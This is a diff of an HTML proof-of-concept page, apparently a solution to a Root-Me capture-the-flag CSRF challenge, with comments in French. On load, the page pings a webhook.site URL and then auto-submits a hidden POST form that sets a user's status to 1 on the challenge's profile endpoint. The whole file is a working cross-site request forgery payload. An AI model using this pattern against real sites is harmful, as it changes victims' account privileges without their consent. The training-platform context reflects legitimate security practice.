@@ -1,8 +1,18 @@
-<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
-  <input type="hidden" name="username" value="test">
-  <input type="hidden" name="status" value="1">
-</form>
+<html>
+  <body>
+    <!-- Ping pour confirmer exécution (optionnel) -->
+    <img src="https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad?csrf_started" />
 
-<script>
-  document.forms[0].submit();
-</script>
+    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" target="_top">
+      <input type="hidden" name="username" value="TON_USERNAME">
+      <input type="hidden" name="status" value="1">
+    </form>
+
+    <script>
+      // Soumission automatique après un court délai (permet l'envoi du ping)
+      setTimeout(() => {
+        document.forms[0].submit();
+      }, 100);
+    </script>
+  </body>
+</html>
